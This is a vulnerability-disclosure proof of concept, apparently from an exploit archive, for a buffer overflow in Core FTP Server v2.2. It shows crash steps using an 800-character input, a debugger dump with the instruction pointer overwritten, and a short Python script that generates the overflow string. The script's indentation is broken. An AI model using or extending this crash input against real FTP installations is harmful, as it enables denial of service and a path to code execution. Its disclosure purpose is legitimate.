'''
# Exploit Title: Core FTP Server v2.2 - BufferOverflow POC
# Date: 2016-6-28
# Exploit Author: Netfairy
# Vendor Homepage: http://www.coreftp.com/
# Software Link: ftp://ftp.coreftp.com/coreftplite.exe
# Version: 2.2
# Tested on: Windows7 Professional SP1 En x86
# CVE : N/A
[+] Type : Buffer overflow
[+] Detail : 
[-]  The vulnerability has the most typical Buffer overflow vulnerabilities. 
[-]  enter the application and Input "A"*800 to the path box the press enter
[-] crash info
0:008> g
(4d48.4cc8): Access violation - code c0000005 (first chance)
First chance exceptions are reported before any exception handling.
This exception may be expected and handled.
eax=00000001 ebx=00440770 ecx=00410041 edx=007c4ee4 esi=00000000 edi=01b1efe8
eip=00410041 esp=0012d6a0 ebp=00410041 iopl=0         nv up ei pl nz na po nc
cs=001b  ss=0023  ds=0023  es=0023  fs=003b  gs=0000             efl=00010202
*** ERROR: Module load completed but symbols could not be loaded for C:\Program Files\CoreFTP\coreftp.exe
coreftp+0x10041:
00410041 008b45fc8be5    add     byte ptr [ebx-1A7403BBh],cl ds:0023:e5d003b5=??


########generate "A"*800
'''

import struct
junk = "A" * 800
with open("exp.txt","wb") as f :
f.write(junk)